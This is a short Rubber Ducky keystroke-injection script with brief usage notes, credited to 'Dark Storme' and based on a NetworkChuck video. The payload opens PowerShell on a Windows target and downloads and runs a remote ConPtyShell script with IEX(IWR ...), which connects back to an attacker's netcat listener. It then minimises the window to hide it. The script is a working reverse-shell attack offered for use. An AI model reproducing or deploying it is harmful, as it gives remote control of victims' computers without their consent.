use the script for inject. bin 
then.
Open terminal on attacking Kali machine and enter

stty raw -echo; (stty size; cat) | nc -lvnp (port number)

This code is based on a video by Networkchuck. I just made the Ducky script.

Have fun.
Dark Storme

REM Title:Reverse shell with poweshell
REM Author:Dark Storme
REM Description:Based on a Video by Network Chuck. I just made a Ducky version.
REM Target:Windows
DELAY 1000
GUI r
DELAY 500
STRING powershell.exe
DELAY 500
ENTER
DELAY 1000
STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (IP) (Port)
DELAY 500
ENTER
DELAY 500
ALT SPACE
STRING N
ENTER
